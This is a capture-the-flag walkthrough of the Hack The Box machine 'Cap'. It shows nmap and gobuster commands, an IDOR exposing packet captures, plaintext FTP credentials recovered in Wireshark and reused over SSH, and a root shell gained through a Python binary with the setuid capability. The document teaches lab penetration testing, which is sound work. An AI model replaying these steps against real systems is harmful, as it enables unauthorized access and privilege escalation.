# HTB: Cap

**Machine:** Cap (Linux)
**Skills:** Web Enumeration (IDOR), Credential Reuse, Linux Capabilities Abuse
**Tools:** nmap, gobuster, Wireshark, SSH, LinPEAS

Target: `10.129.41.151`

---

## Recon — Nmap

```bash
nmap -sC -sV -oN nmap.txt 10.129.41.151
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
```

Three open ports — FTP, SSH, and a web app on Gunicorn (a Python WSGI server, so likely Flask) called "Security Dashboard." The web app is the obvious starting point, since FTP and SSH both need credentials to get anywhere.

## Enumeration — Directory Brute-Force

```bash
gobuster dir -u 10.129.41.151 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Turned up a `/data/` path that serves numbered capture files just by changing the ID in the URL:

```
/data/0 → 0.pcap
/data/1 → 1.pcap
```

No check on which capture ID you're allowed to view — classic IDOR (Insecure Direct Object Reference). Grabbed both files.

## Credential Harvesting — Wireshark

Opened `0.pcap` in Wireshark. FTP sends credentials in plaintext, so filtering for FTP traffic shows the login straight away:

```
username: nathan
password: Buck3tH4TF0RM3!
```

## Foothold — SSH

```bash
ssh nathan@10.129.41.151
ls
cat user.txt
```

The FTP creds work over SSH too — password reuse. That's the foothold, and `user.txt` is sitting right in the home directory.

## Privilege Escalation — LinPEAS

```bash
cd /usr/share/peass/linpeas
scp linpeas.sh nathan@10.129.41.151:linpeas.sh
```

On the target:

```bash
chmod +x linpeas.sh
./linpeas.sh | tee linlog.txt
```

LinPEAS flagged `/usr/bin/python3.8` as having Linux capabilities attached. Capabilities let a binary perform specific privileged actions without being fully setuid-root — in this case, enough to set its own UID.

```bash
/usr/bin/python3.8
```
```python
import os
os.setuid(0)
os.system("/bin/bash")
```

`setuid(0)` from inside a capability-enabled Python interpreter drops straight into a root shell:

```bash
whoami
# root
cd /root
ls
cat root.txt
```

---

Both `user.txt` and `root.txt` captured — box complete.